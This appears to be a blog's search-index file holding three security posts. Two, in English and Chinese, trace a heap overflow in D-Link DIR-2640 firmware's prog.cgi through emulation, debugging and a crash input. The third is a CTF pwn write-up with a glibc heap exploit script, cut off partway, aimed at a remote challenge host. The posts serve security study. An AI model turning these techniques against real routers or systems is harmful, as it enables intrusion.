<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>D-Link Firmware</title>
      <link href="/posts/dlink-en.html"/>
      <url>/posts/dlink-en.html</url>
      
        <content type="html"><![CDATA[<h2 id="D-Link-Firmware"><a href="#D-Link-Firmware" class="headerlink" title="D-Link Firmware:"></a>D-Link Firmware:</h2><p>DIR-2640_REVA_FIRMWARE_1.11B02 </p><h4 id="After-extracting-the-firmware-using-binwalk-drag-prog-cgi-into-IDA-for-analysis"><a href="#After-extracting-the-firmware-using-binwalk-drag-prog-cgi-into-IDA-for-analysis" class="headerlink" title="After extracting the firmware using binwalk, drag prog.cgi into IDA for analysis:"></a>After extracting the firmware using binwalk, drag <code>prog.cgi</code> into IDA for analysis:</h4><p><img src="/../img/1.png" alt="image"></p><p>In the <code>sub_481FC8</code> function, we can see a variable <code>count</code> controlling the number of iterations of a <code>for</code> loop. Within the loop, the <code>strcpy</code> function is used to copy <code>haystack</code> into <code>ptr</code>. However, since <code>count</code> is not validated, if <code>count</code> is sufficiently large, it can cause a heap overflow.</p><h4 id="Checksec-Analysis"><a href="#Checksec-Analysis" class="headerlink" title="Checksec Analysis:"></a>Checksec Analysis:</h4><p><img src="/../img/2.png" alt="image"></p><p>It turns out that no protections are enabled. First, let’s test it under QEMU in user mode. Run <code>prog.cgi</code>:<br><img src="/../img/3.png" alt="image"></p><p>It seems some devices are not mounted, so let’s first start a <code>chroot</code> container and run <code>rcS</code>:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">chroot</span> . ./qemu-mipsel-static ./bin/ash</span><br><span class="line"><span class="built_in">cd</span> /etc/init.d &amp;&amp; ./rcS</span><br></pre></td></tr></table></figure><p><img src="/../img/4.png" alt="image"></p><p>Although there are some issues, some disks are successfully mounted. Now let’s try running <code>prog.cgi</code> again:</p><p><img src="/../img/5.png" alt="image"></p><p>It throws an error. After debugging, we found that the program exits at the <code>sub_42D2DC</code> function. This function is a registry function that triggers an <code>ioctl</code> error when calling the <code>trace</code> function. Therefore, we patched it, successfully entering the main loop:</p><p><img src="/../img/6.png" alt="image"></p><p>Later, we discovered that this program does not communicate over the network but instead uses the <code>getenv</code> function to interact with the web application via environment variables. Despite various attempts, the author could not successfully launch the entire web application, so another approach was needed.</p><h2 id="How-to-Make-the-Program-Crash"><a href="#How-to-Make-the-Program-Crash" class="headerlink" title="How to Make the Program Crash:"></a>How to Make the Program Crash:</h2><p>The vulnerable code is as follows:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">ptr = <span class="built_in">malloc</span>(<span class="number">0xFFF0</span>u);</span><br><span class="line"><span class="keyword">if</span> ( ptr )</span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">memset</span>(ptr, <span class="number">0</span>, <span class="number">2184</span> * v45);</span><br><span class="line">    Count = webGetCount(a1, <span class="string">&quot;/SetScheduleSettings/ScheduleInfoLists#&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> ( !Count )</span><br><span class="line">        Count = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; Count; ++i )</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">memset</span>(v50, <span class="number">0</span>, <span class="keyword">sizeof</span>(v50));</span><br><span class="line">        <span class="built_in">snprintf</span>(v50, <span class="number">0x200</span>u, <span class="string">&quot;/SetScheduleSettings/ScheduleInfoLists:%d/%s&quot;</span>, i, <span class="string">&quot;ScheduleName&quot;</span>);</span><br><span class="line">        haystack = (<span class="type">char</span> *)webGetVarString(a1, (<span class="type">int</span>)v50);</span><br><span class="line">        <span class="keyword">if</span> ( !haystack )</span><br><span class="line">        &#123;</span><br><span class="line">            v26 = <span class="string">&#x27;\v&#x27;</span>;</span><br><span class="line">            <span class="keyword">goto</span> LABEL_87;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> ( !*haystack )</span><br><span class="line">        &#123;</span><br><span class="line">            sub_4812CC(v45);</span><br><span class="line">            <span class="keyword">goto</span> LABEL_78;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">strcpy</span>((<span class="type">char</span> *)ptr + <span class="number">0x888</span> * i + <span class="number">4</span>, haystack);</span><br><span class="line">        ...</span><br><span class="line">    &#125;</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>To trigger the loop and reach <code>strcpy</code>, two conditions must be satisfied:</p><ol><li><code>webGetVarString</code> must return a valid value.</li><li><code>*haystack</code> must not be empty.</li></ol><p>Once these two conditions are met, the <code>strcpy</code> function will be called within the loop, copying up to <code>0x888</code> bytes from <code>haystack</code> into <code>ptr</code>. To keep the loop running, observe the following part of the code:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">memset</span>(v50, <span class="number">0</span>, <span class="keyword">sizeof</span>(v50));</span><br><span class="line"><span class="built_in">snprintf</span>(v50, <span class="number">0x200</span>u, <span class="string">&quot;/SetScheduleSettings/ScheduleInfoLists:%d/ScheduleInfo#&quot;</span>, i);</span><br><span class="line">v46 = webGetCount(a1, v50);</span><br><span class="line"><span class="keyword">if</span> ( <span class="built_in">strstr</span>(haystack, <span class="string">&quot;-UH1xLTJa7O&quot;</span>) )</span><br><span class="line">&#123;</span><br><span class="line">    v37 = <span class="number">0</span>;</span><br><span class="line">    v52[<span class="number">0</span>] = ++v36 + <span class="number">1</span>;</span><br><span class="line">    v35 = <span class="number">1</span>;</span><br><span class="line">    <span class="built_in">strncpy</span>((<span class="type">char</span> *)&amp;v52[<span class="number">761</span> * v36 + <span class="number">2</span>], haystack, <span class="number">0x10</span>u);</span><br><span class="line">    v52[<span class="number">761</span> * v36 + <span class="number">1</span>] = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">    v35 = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> ( v46 )&#123;</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br><span class="line">...</span><br></pre></td></tr></table></figure><p>To simplify the model, set <code>v46</code> to 0 so the <code>if</code> branch is skipped. After entering <code>else</code>, the program will proceed to the next iteration of the loop, achieving our objective.</p><h2 id="Debugging-Method"><a href="#Debugging-Method" class="headerlink" title="Debugging Method:"></a>Debugging Method:</h2><p>Copy <code>qemu-mipsel-static</code> to the root directory of the firmware. Start the <code>chroot</code> container and run the following commands:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cp</span> /usr/bin/qemu-mipsel-static .</span><br><span class="line"><span class="built_in">chroot</span> . ./qemu-mipsel-static ./bin/ash</span><br><span class="line"><span class="built_in">cd</span> /etc/init.d &amp;&amp; ./rcS</span><br><span class="line"><span class="built_in">cd</span> / &amp;&amp; ./qemu-mipsel-static -g 1234 ./bin/prog.cgi</span><br></pre></td></tr></table></figure><p>In another terminal, start <code>gdb-multiarch</code>:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">gdb-multiarch</span><br><span class="line"><span class="comment"># Note: The author used the pwndbg plugin for GDB, but gef should also work.</span></span><br><span class="line">pwndbg&gt; <span class="built_in">set</span> architecture mips</span><br><span class="line">pwndbg&gt; file ./bin/prog.cgi</span><br><span class="line">pwndbg&gt; target remote localhost:1234</span><br><span class="line"><span class="comment"># Then set a breakpoint inside the main function.</span></span><br></pre></td></tr></table></figure><h2 id="Hooking-into-the-sub-481FC8-Function"><a href="#Hooking-into-the-sub-481FC8-Function" class="headerlink" title="Hooking into the sub_481FC8 Function:"></a>Hooking into the <code>sub_481FC8</code> Function:</h2><p>Write a <code>main_hook.so</code> library to hook into the <code>sub_481FC8</code> function using <code>libc_start_main</code>. Provide an arbitrary input, setting <code>count</code> to 64. Below is <code>seeds.bin</code>:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA</span><br></pre></td></tr></table></figure><p>The I&#x2F;O hook function is as follows:<br><img src="/../img/7.png" alt="image"></p><p>With 64 uppercase ‘A’s, set <code>LD_PRELOAD</code> to <code>main_hook.so</code> and run the following command:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">chroot</span> . ./qemu-mipsel-static -L . -E LD_PRELOAD=/lib/libdl.so.0:./stack_hook.so -g 1234 ./bin/prog-cgi seeds.bin &gt; log.txt</span><br></pre></td></tr></table></figure><p>Debug further, and notice a segmentation fault:<br><img src="/../img/8.png" alt="image"></p><p>Upon inspection, it turns out the <code>haystack</code> string overwrote the <code>ptr</code> below it, causing an error when dereferencing <code>ptr</code>. In short, this is a buffer overflow that allows arbitrary write primitives.</p><p>The stack structure is as follows:<br><img src="/../img/9.png" alt="image"></p>]]></content>
      
      
      
        <tags>
            
            <tag> firmware pwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Dlink固件</title>
      <link href="/posts/dlink.html"/>
      <url>/posts/dlink.html</url>
      
        <content type="html"><![CDATA[<h2 id="Dlink固件"><a href="#Dlink固件" class="headerlink" title="Dlink固件:"></a>Dlink固件:</h2><p>DIR-2640_REVA_FIRMWARE_1.11B02 </p><h4 id="binwalk提取固件后将prog-cgi拖入ida分析"><a href="#binwalk提取固件后将prog-cgi拖入ida分析" class="headerlink" title="binwalk提取固件后将prog.cgi拖入ida分析:"></a>binwalk提取固件后将prog.cgi拖入ida分析:</h4><p><img src="/../img/1.png" alt="image"><br>在函数sub_481FC8中，可以看到一个变量count,来控制for循环的次数，循环中，使用strcpy函数把haystack复制到ptr中，而count并没有经过验证，所以当count足够大时，可以造成堆溢出。</p><h4 id="checksec查看保护"><a href="#checksec查看保护" class="headerlink" title="checksec查看保护:"></a>checksec查看保护:</h4><p><img src="/../img/2.png" alt="image"><br>发现啥保护都没开,先在qemu用户态下测试一下,运行prog.cgi<br><img src="/../img/3.png" alt="image"><br>大概是有些设备没挂载，所以我们先启动一个chroot容器，运行一下rcS</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">chroot</span> . ./qemu-mipsel-static ./bin/ash</span><br><span class="line"><span class="built_in">cd</span> /etc/init.d &amp;&amp; ./rcS</span><br></pre></td></tr></table></figure><p><img src="/../img/4.png" alt="image"></p><p>虽然有些问题，但还是挂载了一些盘上去，再运行prog.cgi试试</p><p><img src="/../img/5.png" alt="image"></p><p>报错，经过调试，发现程序在函数sub_42D2DC退出，该函数是一个注册表函数，其在调用函数trace时，会触发ioctl的报错，所以我们把它patch掉,成功进入主循环</p><p><img src="/../img/6.png" alt="image"></p><p>后来发现这个程序并不是通过网络来通信，而是利用getenv函数，通过环境变量来与web应用通信。而启动整个web应用，作者做过诸多尝试，但还是不行，所以得换个思路。</p><h2 id="关于如何让程序崩溃"><a href="#关于如何让程序崩溃" class="headerlink" title="关于如何让程序崩溃:"></a>关于如何让程序崩溃:</h2><p>需要攻击的代码如下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">ptr = <span class="built_in">malloc</span>(<span class="number">0xFFF0</span>u);</span><br><span class="line">  <span class="keyword">if</span> ( ptr )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">memset</span>(ptr, <span class="number">0</span>, <span class="number">2184</span> * v45);</span><br><span class="line">    Count = webGetCount(a1, <span class="string">&quot;/SetScheduleSettings/ScheduleInfoLists#&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> ( !Count )</span><br><span class="line">      Count = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; Count; ++i )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">memset</span>(v50, <span class="number">0</span>, <span class="keyword">sizeof</span>(v50));</span><br><span class="line">      <span class="built_in">snprintf</span>(v50, <span class="number">0x200</span>u, <span class="string">&quot;/SetScheduleSettings/ScheduleInfoLists:%d/%s&quot;</span>, i, <span class="string">&quot;ScheduleName&quot;</span>);</span><br><span class="line">      haystack = (<span class="type">char</span> *)webGetVarString(a1, (<span class="type">int</span>)v50);</span><br><span class="line">      <span class="keyword">if</span> ( !haystack )</span><br><span class="line">      &#123;</span><br><span class="line">        v26 = <span class="string">&#x27;\v&#x27;</span>;</span><br><span class="line">        <span class="keyword">goto</span> LABEL_87;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">if</span> ( !*haystack )</span><br><span class="line">      &#123;</span><br><span class="line">        sub_4812CC(v45);</span><br><span class="line">        <span class="keyword">goto</span> LABEL_78;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="built_in">strcpy</span>((<span class="type">char</span> *)ptr + <span class="number">0x888</span> * i + <span class="number">4</span>, haystack);</span><br><span class="line">      ...&#125;</span><br><span class="line">      &#125;</span><br><span class="line">      ...</span><br></pre></td></tr></table></figure><p>我们需要让循环跑到strcpy那里，需要满足两个约束：<code>webGetVarString返回有效值</code>，<code>*haystack不为空</code>,只要满足这两个条件，就会在循环中调用strcpy函数，将haystack中0x888长度的内容copy到ptr中；除此之外,我们要让循环继续执行下去，往下看看代码:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">memset</span>(v50, <span class="number">0</span>, <span class="keyword">sizeof</span>(v50));</span><br><span class="line">      <span class="built_in">snprintf</span>(v50, <span class="number">0x200</span>u, <span class="string">&quot;/SetScheduleSettings/ScheduleInfoLists:%d/ScheduleInfo#&quot;</span>, i);</span><br><span class="line">      v46 = webGetCount(a1, v50);</span><br><span class="line">      <span class="keyword">if</span> ( <span class="built_in">strstr</span>(haystack, <span class="string">&quot;-UH1xLTJa7O&quot;</span>) )</span><br><span class="line">      &#123;</span><br><span class="line">        v37 = <span class="number">0</span>;</span><br><span class="line">        v52[<span class="number">0</span>] = ++v36 + <span class="number">1</span>;</span><br><span class="line">        v35 = <span class="number">1</span>;</span><br><span class="line">        <span class="built_in">strncpy</span>((<span class="type">char</span> *)&amp;v52[<span class="number">761</span> * v36 + <span class="number">2</span>], haystack, <span class="number">0x10</span>u);</span><br><span class="line">        v52[<span class="number">761</span> * v36 + <span class="number">1</span>] = <span class="number">0</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">        v35 = <span class="number">0</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">if</span> ( v46 )&#123;</span><br><span class="line">        ...</span><br><span class="line">      &#125;</span><br><span class="line">      ...</span><br></pre></td></tr></table></figure><p>为了简化模型，我们控制v46为0,不进入if分支，后续进入else后程序会进入下一次循环，这样我们的目的就达到了。</p><h2 id="调试方法"><a href="#调试方法" class="headerlink" title="调试方法:"></a>调试方法:</h2><p>将qemu-mipsel-static复制到固件根目录下,chroot启动容器,运行以下命令</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cp</span> /usr/bin/qemu-mipsel-static .</span><br><span class="line"><span class="built_in">chroot</span> . ./qemu-mipsel-static ./bin/ash</span><br><span class="line"><span class="built_in">cd</span> /etc/init.d &amp;&amp; ./rcS</span><br><span class="line"><span class="built_in">cd</span> / &amp;&amp; ./qemu-mipsel-static -g 1234./bin/prog.cgi</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>再另起一个终端，启动gdb-multiarch</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">gdb-multiarch</span><br><span class="line"><span class="comment">#注意，作者使用了gdb的插件pwndbg，使用gef应该也可以</span></span><br><span class="line">pwndbg&gt;<span class="built_in">set</span> architecture mips</span><br><span class="line">pwndbg&gt;file ./bin/prog.cgi</span><br><span class="line">pwndbg&gt;target remote localhost:1234</span><br><span class="line"><span class="comment">#然后断点打到main函数里面</span></span><br></pre></td></tr></table></figure><h2 id="hook到sub-481FC8函数"><a href="#hook到sub-481FC8函数" class="headerlink" title="hook到sub_481FC8函数:"></a>hook到sub_481FC8函数:</h2><p>编写一个main_hook.so,利用libc_start_main函数,hook到sub_481FC8函数，随意编写一个输入,count定为64，以下是seeds.bin:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA</span><br></pre></td></tr></table></figure><p>io钩子函数如下<br><img src="/../img/7.png" alt="image"><br>64个大写的A,先把LD_PRELOAD设为main_hook.so,运行以下指令:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">chroot</span> . ./qemu-mipsel-static -L . -E LD_PRELOAD=/lib/libdl.so.0:./stack_hook.so -g 1234 ./bin/prog-cgi seeds.b</span><br><span class="line"><span class="keyword">in</span> &gt; log.txt</span><br></pre></td></tr></table></figure><p>往下调试发现报了一个段错误:<br><img src="/../img/8.png" alt="image"><br>检查发现是haystack这个字符串把下面的ptr给覆盖了，所以在解引用ptr时，出现了报错，简单来说，这里有个缓冲区溢出，并且能够实现任意地址写的原语。<br>栈结构如下:<br><img src="/../img/9.png" alt="image"></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>hgame_week3_pwn题解</title>
      <link href="/posts/hgame_week3.html"/>
      <url>/posts/hgame_week3.html</url>
      
        <content type="html"><![CDATA[<h2 id="溢出来了"><a href="#溢出来了" class="headerlink" title="溢出来了"></a>溢出来了</h2><h3 id="offset-by-null"><a href="#offset-by-null" class="headerlink" title="offset_by_null"></a>offset_by_null</h3><p>利用的是堆合并时的漏洞，glibc 2.27的unsorted bin chunk在合并时，会根据当前chunk的prev in use位来判断是否向前&#x2F;向后合并，然后通过prev size取到unsortedbin chunk的地址，这个时候会做一次检查，但中间合并的chunk他是不会做检查的，也就是说，即便中间的chunk是 in use的状态，也会被合并进去。也就是说我们可以构造一个这样的结构，假设有三个地址连续的chunk，我们把第一个chunk放进unsorted bin中，chunk2和chunk3 malloc出来，通过chunk2的offset by null改到chunk3的prev in use位，然后再把chunk3放入unsorted bin，触发合并，那么，正在in use状态的chunk2就会被合并进去,此时我们仍能访问到chunk2，uaf就达成了。这里可以泄露一次libc.</p><h3 id="fastbins-double-free任意地址写"><a href="#fastbins-double-free任意地址写" class="headerlink" title="fastbins_double_free任意地址写"></a>fastbins_double_free任意地址写</h3><p>可是这里充其量只能泄露，chunk中的内容已经不能修改了，我们得换种思路实现任意地址写，这里应该能用heap overlapping, 但本人用的是fastbin double free,通过切割unsorted bin来实现的。我们合并完后，会得到一个0x300大小的unsorted bin,此时我们的note指针还残留了一个，还可以free一次，也就是说，只要合理地切分这个0x300的chunk，我们是有办法将残留指针指向的chunk放进fastbins的，此时再free这个指针，double free就实现了,计算得到切割块的大小必须得是0x40(由于需要填充tcache)</p><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#p=process(&quot;./vuln&quot;)</span></span><br><span class="line">p=remote(<span class="string">&quot;139.196.183.57&quot;</span>,<span class="number">30703</span>)</span><br><span class="line">elf=ELF(<span class="string">&quot;./vuln&quot;</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add_note</span>(<span class="params">index,size,payload</span>):</span><br><span class="line">p.sendlineafter(<span class="string">&quot;Your choice:&quot;</span>,<span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">p.sendlineafter(<span class="string">&quot;Index: &quot;</span>,<span class="built_in">str</span>(index))</span><br><span class="line">p.sendlineafter(<span class="string">&quot;Size: &quot;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">p.sendafter(<span class="string">&quot;Content: &quot;</span>,payload)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">index</span>):</span><br><span class="line">p.sendlineafter(<span class="string">&quot;Your choice:&quot;</span>,<span class="built_in">str</span>(<span class="number">3</span>))</span><br><span class="line">p.sendlineafter(<span class="string">&quot;Index: &quot;</span>,<span class="built_in">str</span>(index))</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">index</span>):</span><br><span class="line">p.sendlineafter(<span class="string">&quot;Your choice:&quot;</span>,<span class="built_in">str</span>(<span class="number">2</span>))</span><br><span class="line">p.sendlineafter(<span class="string">&quot;Index: &quot;</span>,<span class="built_in">str</span>(index))</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">exit</span>():</span><br><span class="line">p.sendlineafter(<span class="string">&quot;Your choice:&quot;</span>,<span class="built_in">str</span>(<span class="number">4</span>))</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">add_note(i,<span class="number">0xf8</span>,<span class="string">b&quot;a&quot;</span>*<span class="number">0xf8</span>)</span><br><span class="line">add_note(<span class="number">7</span>,<span class="number">0xf8</span>,<span class="string">b&quot;a&quot;</span>*<span class="number">0xf8</span>)</span><br><span class="line">add_note(<span class="number">8</span>,<span class="number">0xf8</span>,<span class="string">b&quot;a&quot;</span>*<span class="number">0xf8</span>)</span><br><span class="line">add_note(<span class="number">9</span>,<span class="number">0xf8</span>,<span class="string">b&quot;a&quot;</span>*<span class="number">0xf8</span>)</span><br><span class="line">add_note(<span class="number">10</span>,<span class="number">0xf0</span>,<span class="string">b&quot;a&quot;</span>*<span class="number">0xf0</span>)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">add_note(<span class="number">11</span>,<span class="number">0x10</span>,<span class="string">b&quot;a&quot;</span>*<span class="number">0x10</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">delete(i)</span><br><span class="line">delete(<span class="number">8</span>)</span><br><span class="line">add_note(<span class="number">6</span>,<span class="number">0xf0</span>,<span class="string">b&quot;a&quot;</span>*<span class="number">0xf0</span>)</span><br><span class="line">delete(<span class="number">9</span>)</span><br><span class="line">add_note(<span class="number">9</span>,<span class="number">0xf8</span>,<span class="number">0xf0</span>*<span class="string">b&quot;a&quot;</span>+p64(<span class="number">0x200</span>))</span><br><span class="line">delete(<span class="number">6</span>)</span><br><span class="line">delete(<span class="number">10</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">add_note(i,<span class="number">0xf0</span>,<span class="string">b&quot;a&quot;</span>*<span class="number">0xf0</span>)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">add_note(<span class="number">8</span>,<span class="number">0xf8</span>,<span class="string">b&quot;a&quot;</span>*<span class="number">0xf0</span>+p64(<span class="number">0x100</span>))</span><br><span class="line">show(<span class="number">9</span>)</span><br><span class="line">offset=<span class="number">4111520</span></span><br><span class="line">main_arena=u64(p.recv(<span class="number">8</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&quot;\x00&quot;</span>))</span><br><span class="line">libc_base=main_arena-offset</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(libc_base))</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">libc=ELF(<span class="string">&quot;./libc-2.27.so&quot;</span>)</span><br><span class="line">free_hook=libc_base+libc.sym[<span class="string">&quot;__free_hook&quot;</span>]</span><br><span class="line"><span class="comment">#add_note(12,0xa0)</span></span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line"><span class="comment">#add_note(9,0xf9,p64(main_arena)+p64(free_hook)+b&quot;a&quot;*0xe9)</span></span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">add_note(<span class="number">12</span>,<span class="number">0xf0</span>,<span class="string">b&quot;a&quot;</span>*<span class="number">0xf0</span>)</span><br><span class="line">add_note(<span class="number">10</span>,<span class="number">0xf0</span>,<span class="string">b&quot;a&quot;</span>*<span class="number">0xf0</span>)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">6</span>):</span><br><span class="line">delete(i)</span><br><span class="line">delete(<span class="number">12</span>)</span><br><span class="line">delete(<span class="number">8</span>)</span><br><span class="line">add_note(<span class="number">12</span>,<span class="number">0xf8</span>,<span 